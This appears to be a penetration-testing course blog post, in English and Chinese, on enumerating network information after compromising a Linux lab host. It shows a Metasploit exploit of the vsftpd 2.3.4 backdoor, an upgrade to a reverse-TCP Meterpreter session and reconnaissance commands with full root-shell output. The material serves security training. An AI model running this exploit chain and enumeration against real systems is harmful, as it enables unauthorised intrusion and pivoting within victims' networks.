---
layout: post
title: "Enumerating Network Information"
date: "2023-06-13"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Linux Local Enumeration
## Enumerating Network Information
What are we looking for?
* Current IP address & network adapter
* Internal networks
* TCP/UDP services running and their respective ports
* Other hosts on the network

## Demo: Enumerating Network Information

# Linux 本地枚举
## 枚举网络信息
我们在寻找什么？

* 当前 IP 地址和网络适配器
* 内部网络
* 正在运行的 TCP/UDP 服务及其相应的端口
* 网络上的其他主机

## 演示：枚举网络信息
Kali Linux : 192.198.70.2

Target IP Address : 192.198.70.3

```
msfconsole
setg RHOSTS 192.198.70.3
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
exploit
```

We should obtain a command shell session, which we can then updrade to a Meterpreter session.

I'll use the `Ctrl+Z` keys on my keyboard to put this into the background.

```
sessions
sessions -u 1
```

That is going to give us a Meterpreter session or upgrade our command shell session into a Meterpreter session.

```
sessions
sessions 2
```

Let's take a look at how we can perform network information enumeration with my Meterpreter first.

You can obtain the current IP address and the network interface details.

```
meterpreter > ifconfig
```

We can also obtain or get a list of the currently running TCP and UDP services.

```
meterpreter > netstat
```

This will display the connection list.

You can also display the routing table with Meterpreter.

```
meterpreter > route
```

It'll display the routing table.

The key information that we're interested in here is the Gateway. That's very important information. Because in some networks, this may be the router or it could also be the DNS server and the DHCP server all in one.

Now that we've taken a look at how to enumerate network information with Meterpreter, we can open up a command shell session. And I'll open up a bash session here.

```
meterpreter > shell
/bin/bash -i
```

```
ifconfig
ip a s
```

This will display all the interfaces or the adaptors. That'll give you an idea as to all the interfaces that are connected to the target system, and this is where you typically find other networks that you can pivot to.

We can also cat out the contents of the networks file. 

```
cat /etc/networks
```

This will display a list of interfaces and the configuration.

We can get the hostname. That can be done by catting out the content of the `/etc/hostname` file.

```
cat /etc/hostname
```

If we want to enumerate the content of the hosts file.

```
cat /etc/hosts
```

This will display the hosts as well as the domain pertinent to that particular IP address. This can be quite important if you are trying to identify internal domains that you can access. This is configured locally. For example, if I added another host, I could add the Kali Linux system and specify the IP address of the Kali Linux system. That is something that we'll be exploring during the pivoting.

We can also display the DNS information.

```
cat /etc/resolv.conf
```

This will display the main name server. That's how to display the DNS information or configuration for that matter.

If you want to find other systems or you want to display the ARP table, which will give you an idea of other systems that are part of the network that the target system you have compromised is a part of.

```
arp -a
```

If the `arp` utility is not stored, we can terminate this command shell session, and we can go back into our Meterpreter session. 

```
sessions
sessions -u 1
sessions
sessions 3
```

```
meterpreter > help
```

`arp`: Display the host ARP cache.

`arp`：显示主机ARP缓存。

```
meterpreter > arp
```

If we were performing pivoting or if we wanted to identify systems that we can pivot to, then we would typically utilize this command in conjunction with a few others.

That is how to perform network information enumeration on Linux.

# Enumerating Network Information
## Overview
Goal

This lab covers the process enumerating network information from a target system running Linux.

# 枚举网络信息
## 概述
目标

本实验涵盖从运行 Linux 的目标系统枚举网络信息的过程。

## 复现视频内容
Kali Linux : 192.103.56.2

Target IP Address : 192.103.56.3

```
root@attackdefense:~# service postgresql start && msfconsole -q
[ ok ] Starting PostgreSQL 11 database server: main.
msf5 > setg RHOSTS 192.103.56.3
RHOSTS => 192.103.56.3
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.103.56.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.103.56.3:21 - USER: 331 Please specify the password.
[+] 192.103.56.3:21 - Backdoor service has been spawned, handling...
[+] 192.103.56.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.103.56.2:39117 -> 192.103.56.3:6200) at 2023-06-13 02:23:38 +0000

^Z
Background session 1? [y/N]  y
```

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.103.56.2:39117 -> 192.103.56.3:6200 (192.103.56.3)

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.103.56.2:4433 
[*] Sending stage (985320 bytes) to 192.103.56.3
[*] Meterpreter session 2 opened (192.103.56.2:4433 -> 192.103.56.3:48802) at 2023-06-13 02:25:41 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                  Connection
  --  ----  ----                   -----------                                  ----------
  1         shell cmd/unix                                                      192.103.56.2:39117 -> 192.103.56.3:6200 (192.103.56.3)
  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.103.56.3  192.103.56.2:4433 -> 192.103.56.3:48802 (192.103.56.3)

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```

```
meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface  2
============
Name         : ip_vti0
Hardware MAC : 00:00:00:00:00:00
MTU          : 1480
Flags        : NOARP


Interface 141414
============
Name         : eth0
Hardware MAC : 02:42:c0:67:38:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.103.56.3
IPv4 Netmask : 255.255.255.0
```

```
meterpreter > netstat

Connection list
===============

    Proto  Local address       Remote address      State        User   Inode  PID/Program name
    -----  -------------       --------------      -----        ----   -----  ----------------
    tcp    127.0.0.11:34161    0.0.0.0:*           LISTEN       65534  0      
    tcp    0.0.0.0:21          0.0.0.0:*           LISTEN       0      0      
    tcp    0.0.0.0:6200        0.0.0.0:*           LISTEN       0      0      
    tcp    192.103.56.3:6200   192.103.56.2:39117  ESTABLISHED  0      0      
    tcp    192.103.56.3:48802  192.103.56.2:4433   ESTABLISHED  0      0      
    udp    127.0.0.11:52138    0.0.0.0:*                        65534  0      
```

```
meterpreter > route

IPv4 network routes
===================

    Subnet        Netmask        Gateway       Metric  Interface
    ------        -------        -------       ------  ---------
    0.0.0.0       0.0.0.0        192.103.56.1  0       eth0
    192.103.56.0  255.255.255.0  0.0.0.0       0       eth0

No IPv6 routes were found.
```

```
meterpreter > arp

ARP cache
=========

    IP address    MAC address        Interface
    ----------    -----------        ---------
    192.103.56.2  02:42:c0:67:38:02  
```

```
meterpreter > shell
Process 22 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~/vsftpd-2.3.4# ifconfig
ifconfig
bash: ifconfig: command not found
root@victim-1:~/vsftpd-2.3.4# ip a s
ip a s
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
141414: eth0@if141415: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:67:38:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.103.56.3/24 brd 192.103.56.255 scope global eth0
       valid_lft forever preferred_lft forever
```

```
root@victim-1:~/vsftpd-2.3.4# cat /etc/networks
cat /etc/networks
default         0.0.0.0
loopback        127.0.0.0
link-local      169.254.0.0
```

```
root@victim-1:~/vsftpd-2.3.4# cat /etc/hostname
cat /etc/hostname
victim-1
```

```
root@victim-1:~/vsftpd-2.3.4# cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.103.56.3    victim-1
```

```
root@victim-1:~/vsftpd-2.3.4# cat /etc/resolv.conf
cat /etc/resolv.conf
search members.linode.com
nameserver 127.0.0.11
options edns0 trust-ad ndots:0
```

```
root@victim-1:~/vsftpd-2.3.4# arp -a
arp -a
bash: arp: command not found
```